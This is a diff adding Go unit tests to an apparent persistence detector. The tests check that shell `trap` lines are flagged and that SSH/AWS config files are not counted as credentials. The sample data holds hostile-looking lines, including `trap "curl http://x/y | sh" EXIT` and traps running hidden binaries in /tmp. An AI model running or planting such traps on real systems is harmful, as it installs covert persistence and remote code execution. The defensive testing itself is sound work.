@@ -172,3 +172,43 @@ func TestNoExecEntraNaEvidencia(t *testing.T) {
 		t.Error("o filesystem impedir a execução muda a urgência, e precisa aparecer")
 	}
 }
+
+// O `trap` de shell arma persistência que não aparece em processo, cron nem
+// unit. As três formas são reconhecidas; restaurar o padrão NÃO é achado.
+func TestTrapDeShell(t *testing.T) {
+	arma := []string{
+		`trap '/usr/local/bin/.x' DEBUG`,
+		`trap "curl http://x/y | sh" EXIT`,
+		`trap '/tmp/.k' ERR`,
+		`cd /tmp; trap '/tmp/.k' DEBUG`,
+	}
+	for _, l := range arma {
+		if _, _, ok := execSuspect(l); !ok {
+			t.Errorf("%q arma um trap e não foi reconhecida", l)
+		}
+	}
+
+	naoArma := []string{
+		// Restaurar o padrão não executa nada.
+		`trap - INT TERM`,
+		// `trap` no meio de outra palavra ou de um caminho não arma nada.
+		`/usr/bin/mytrap --run`,
+		`echo trapezio`,
+	}
+	for _, l := range naoArma {
+		if motivo, _, ok := execSuspect(l); ok {
+			t.Errorf("%q não arma trap e foi acusada: %s", l, motivo)
+		}
+	}
+}
+
+// `.ssh/config` e `.aws/config` são CONFIGURAÇÃO e vivem em 0644 legitimamente.
+// Apontar para uma chave não é conter uma — e o primeiro rendeu um aviso num
+// host limpo antes de a distinção existir.
+func TestConfigNaoEhCredencial(t *testing.T) {
+	for _, c := range facts.CaminhosDeSegredo() {
+		if strings.HasSuffix(c, "/config") && !strings.Contains(c, "kube") {
+			t.Errorf("%q é configuração, não credencial: apontar não é conter", c)
+		}
+	}
+}
